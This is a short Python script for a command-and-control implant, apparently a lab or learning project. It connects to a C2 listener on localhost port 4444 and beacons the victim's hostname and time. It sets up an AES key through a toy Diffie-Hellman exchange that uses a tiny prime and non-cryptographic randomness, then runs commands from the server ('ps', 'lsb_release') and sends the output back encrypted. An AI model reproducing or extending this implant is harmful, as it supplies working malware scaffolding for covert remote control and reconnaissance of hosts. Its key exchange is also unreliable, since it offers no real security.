#!/bin/python3
import socket
import datetime
import json
import time
import subprocess
import hashlib
import random
import base64
from Crypto.Cipher import AES
from Crypto import Random
class key:
    
    def __init__(self):
        self.p = 10009
        self.g = 9166
        self.secret = random.randint(1,10000)
        self.half_key = self.gen_half()

    def gen_half(self):
        half_key = pow(self.g, self.secret, self.p)
        return half_key

    def gen_full(self, new_half):
        full_key = pow(new_half, self.secret, self.p)
        return hashlib.sha256(str(full_key).encode()).digest()

class C2_AES:
    
    def __init__(self, key):
        self.BLOCK_SIZE = 16
        self.pad = lambda s: s + ((self.BLOCK_SIZE - len(s) % self.BLOCK_SIZE) * chr(self.BLOCK_SIZE - len(s) % self.BLOCK_SIZE)).encode()
        self.unpad = lambda s: s[:-ord(s[len(s) - 1:])]
        self.key = key

    def encrypt(self, raw):
        raw = self.pad(raw.encode())
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.unpad(cipher.decrypt(enc[16:]))


class implant:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
    def connect(self):
        self.sock = socket.create_connection((self.ip, self.port))

    def send_msg(self, data):
        aes = C2_AES(self.aes_secret)
        msg = aes.encrypt(data)
        self.sock.send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)

    def communicate(self):
        while True:
            data_len = self.sock.recv(8)
            data = self.sock.recv(int(data_len.decode()))
            aes = C2_AES(self.aes_secret)
            data = aes.decrypt(data)
            print(f"Recieved {data.decode()}")
            if data.decode() == "test":
                print("Sending synack...")
                time.sleep(1)
                self.send_msg("synack")
            elif data.decode() == "lsb_release":
                data = subprocess.check_output(['lsb_release', '-a'])
                self.send_msg(data.decode())
            elif data.decode() == "ps":
                data = subprocess.check_output(['ps', '-ef'])
                self.send_msg(data.decode())

    def intro(self):
        key_gen = key()
        time_info = datetime.datetime.now()
        self.implant_info = {
        "hostname" : socket.gethostname(),
        "date" : f"{time_info.day}/{time_info.month}/{time_info.year}",
        "time" : f"{time_info.hour}:{time_info.minute}:{time_info.second}",
        "number" : f"{key_gen.half_key}"
        }
        self.sock.send(json.dumps(self.implant_info).encode())
        server_half = self.sock.recv(1024)
        self.aes_secret = key_gen.gen_full(int(server_half.decode()))

my_implant = implant('127.0.0.1', 4444)
my_implant.connect()
my_implant.intro()
my_implant.communicate()
